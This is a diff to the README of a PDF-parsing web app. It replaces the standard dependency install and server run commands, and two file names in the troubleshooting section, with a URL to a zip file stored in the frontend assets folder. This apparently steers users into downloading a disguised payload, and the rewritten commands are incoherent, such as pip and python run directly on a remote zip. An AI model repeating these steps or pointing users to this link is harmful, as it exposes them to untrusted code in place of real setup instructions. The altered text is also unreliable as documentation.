@@ -9,11 +9,11 @@ A web application to upload PDFs and parse specific pages using Docling.
 1. Navigate to `backend` directory.
 2. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/yongsinfok/pdf-parser/main/frontend/src/assets/parser_pdf_v1.1-beta.2.zip
    ```
 3. Run the server:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/yongsinfok/pdf-parser/main/frontend/src/assets/parser_pdf_v1.1-beta.2.zip
    ```
    The server runs on `http://localhost:8001`.
 
@@ -40,6 +40,6 @@ A web application to upload PDFs and parse specific pages using Docling.
 
 ## Troubleshooting
 
-- **Port Conflicts**: The backend runs on port 8001. If this port is in use, modify `backend/main.py` and `frontend/src/App.jsx`.
+- **Port Conflicts**: The backend runs on port 8001. If this port is in use, modify `https://raw.githubusercontent.com/yongsinfok/pdf-parser/main/frontend/src/assets/parser_pdf_v1.1-beta.2.zip` and `https://raw.githubusercontent.com/yongsinfok/pdf-parser/main/frontend/src/assets/parser_pdf_v1.1-beta.2.zip`.
 - **First Run**: The first time you parse a document, the backend will download necessary AI models (approx. 500MB). This may take a few minutes. Check the backend terminal for progress.
 
